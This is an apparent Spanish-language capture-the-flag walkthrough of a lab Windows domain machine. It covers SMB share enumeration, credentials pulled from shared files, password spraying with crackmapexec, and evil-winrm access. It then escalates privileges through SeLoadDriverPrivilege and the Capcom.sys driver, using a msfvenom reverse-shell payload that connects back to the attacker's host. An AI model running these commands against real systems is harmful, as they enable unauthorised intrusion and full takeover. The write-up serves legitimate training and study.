Hacemos el escaneo de nmap, donde ya vemos el dominio pacharan.htl:
![[Pasted image 20240805094348.png]]
Probamos en enumerar recursos compartidos como el usuario invitado:
```bash
smbmap -H 192.168.69.69 -u invitado
```
![[Pasted image 20240805094811.png]]
Vemos que podemos leer el recurso compartido de NETLOGON2, por lo que vamos a acceder a él y nos encontramos con un archivo llamado Orujo.txt:
```bash
smbclient -U invitado //192.168.69.69/NETLOGON2
```
![[Pasted image 20240805094941.png]]
Ahora que tenemos unas credenciales, vamos a enumerar recursos compartidos con este acceso, donde vemos que podemos leer el recurso compartido PACHARAN:
```bash
smbmap -H 192.168.69.69 -u Orujo -p Pericodelospalotes6969
```
![[Pasted image 20240805095410.png]]
Por lo que accedemos a este recurso compartido y vemos un archivo llamado ah.txt, que nos lo traeremos:
```bash
smbclient -U Orujo //192.168.69.69/PACHARAN
```
![[Pasted image 20240805095522.png]]
Donde vemos un listado de contraseñas:
![[Pasted image 20240805095545.png]]
Ahora que tenemos estas credenciales, vamos a enumerar usuarios con rpcclient usando el acceso de Orujo:
```bash
rpcclient -U 'Orujo' 192.168.69.69
```
![[Pasted image 20240805095732.png]]
Esta lista de usuarios nos la guardaremos en un archivo .txt llamado users.txt y luego le aplicaremos un filtro de los usuarios de la siguiente forma:
```bash
awk -F'[][]' '{print $2}' users.txt > users_filtrados.txt
```
- `-F'[][]'`: Esto establece los corchetes como delimitadores de campo.
- `{print $2}`: Imprime el segundo campo, que es el nombre del usuario.

Ahora usando crackmapexec haremos fuerza bruta probando con el listado de usuarios y contraseñas obtenido previamente:
```bash
crackmapexec smb 192.168.69.69 -u users_filtrados.txt -p ah.txt
```
![[Pasted image 20240805100405.png]]
Tenemos el siguiente acceso:
```bash
Whisky:MamasoyStream2er@
```
Y con este nuevo acceso volvemos a probar qué podemos enumerar con rpcclient, y vemos que nos encontramos con enumprinters:
```bash
rpcclient -U 'Whisky' 192.168.69.69
```
![[Pasted image 20240805100702.png]]
Por lo que si ejecutamos el comando enumprinters, vemos una posible contraseña:
![[Pasted image 20240805100735.png]]
Y haciendo fuerza bruta con crackmapexec tanto por smb como por winrm vemos que tenemos el acceso válido con el usuario Chivas Regal:
```bash
crackmapexec smb 192.168.69.69 -u users_filtrados.txt -p TurkisArrusPuchuchuSiu1
crackmapexec winrm 192.168.69.69 -u users_filtrados.txt -p TurkisArrusPuchuchuSiu1
```
![[Pasted image 20240805100904.png]]
Accedemos por evil-winrm:
```bash
evil-winrm -i 192.168.69.69 -u 'Chivas Regal' -p TurkisArrusPuchuchuSiu1
```
![[Pasted image 20240805101417.png]]
Enumeramos privilegios del usuario:
```bash
whoami /priv
```
![[Pasted image 20240805101500.png]]
Vemos que tenemos el permiso **SeLoadDriverPrivilege**, 

SeLoadDriverPrivilege especifica los usuarios que tienen permiso para cargar dinámicamente controladores de dispositivos y con esto habilita la posibilidad de ejecutar código en el espacio del núcleo.

el cual tenemos la explicación de dicho privilegio en este artículo:
```bash
https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/
https://github.com/JoshMorrison99/SeLoadDriverPrivilege
```
Seguiremos los pasos del post de github:
![[Pasted image 20240805102654.png]]
Nos bajamos todos estos archivos y los subiremos a la máquina víctima:
![[Pasted image 20240805101942.png]]
Y ahora ejecutaremos crearemos un payload .exe con msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.3 LPORT=4444 -f exe -o rev.exe
```
![[Pasted image 20240805102833.png]]
Lo subimos:
![[Pasted image 20240805102849.png]]
Y ahora con LoadDriver.exe vamos a cargar Capcom.sys:
```bash
.\LoadDriver.exe System\CurrentControlSet\MyService Capcom.sys
```
![[Pasted image 20240805103032.png]]
Y ahora con .\ExploitCapcom.exe vamos a usar el payload rev.exe creado anteriormente con msfvenom:
```bash
.\ExploitCapcom.exe rev.exe
```
![[Pasted image 20240805103146.png]]
Y habremos recibido la conexión:
![[Pasted image 20240805103204.png]]
